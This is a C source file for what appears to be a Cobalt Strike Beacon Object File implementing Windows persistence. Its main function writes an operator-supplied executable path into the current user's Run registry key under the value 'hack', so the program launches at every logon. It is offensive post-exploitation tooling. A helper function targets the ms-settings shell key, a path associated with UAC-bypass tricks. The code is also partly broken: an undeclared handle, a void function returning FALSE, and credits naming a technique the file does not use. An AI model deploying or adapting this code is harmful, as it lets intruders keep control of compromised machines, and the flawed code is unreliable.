/*
 * Credits: 
	- @cocomelonc - Malware Development for Ethical Hackers : windows persistence via AppInit_DLLs.
	- John Hammond BOF Tutorial
	- Sektor7's COFF Module
*/
#include <windows.h>
#include <string.h>

WINADVAPI LSTATUS WINAPI ADVAPI32$RegCreateKeyExA(HKEY,LPCSTR,DWORD,LPSTR,DWORD,REGSAM,const LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
WINADVAPI LSTATUS WINAPI ADVAPI32$RegSetValueExA(HKEY,LPCSTR,DWORD,DWORD,const BYTE *,DWORD);
WINADVAPI LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY);
WINADVAPI LSTATUS WINAPI ADVAPI32$RegDeleteKeyExW(HKEY ,LPCWSTR ,REGSAM ,DWORD);
WINADVAPI LSTATUS WINAPI ADVAPI32$RegOpenKeyExA(HKEY,LPCSTR,DWORD,REGSAM,PHKEY);
WINADVAPI LSTATUS WINAPI ADVAPI32$RegDeleteKeyExA(HKEY ,LPCSTR ,REGSAM ,DWORD);


// Steps: 
// 1. Delete/Reset the subkey/value
// 2. Query them again for confirmation
void DeleteRegKeys(){
	if (!ADVAPI32$RegDeleteKeyExA(hKey, "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\\", KEY_WOW64_64KEY, 0))
		return FALSE;

	return;
}


// Usage: pers-runkeys <evilFullPath> <>
void go(char *args, int alen) {
	datap parser;
	char* exe; 	// Argument expectation: char* exe = "C:\\Users\\<path>\\persistence\\evil.exe";
	char* delResult;
	
	// Prepare data parser
	BeaconDataParse(&parser, args, alen);
	
	// Unpack Data
	exe = BeaconDataExtract(&parser, NULL);
	
	HKEY hkey = NULL;

	BeaconPrintf(CALLBACK_OUTPUT, "[*] Is SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run available?\n");

	// Startup
	LONG res = ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER,(LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_WRITE, &hkey);
	if(res == ERROR_SUCCESS) {
		// Create new registry key
		ADVAPI32$RegSetValueExA(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
		ADVAPI32$RegCloseKey(hkey);
	} else {
		
	}

	return;
}
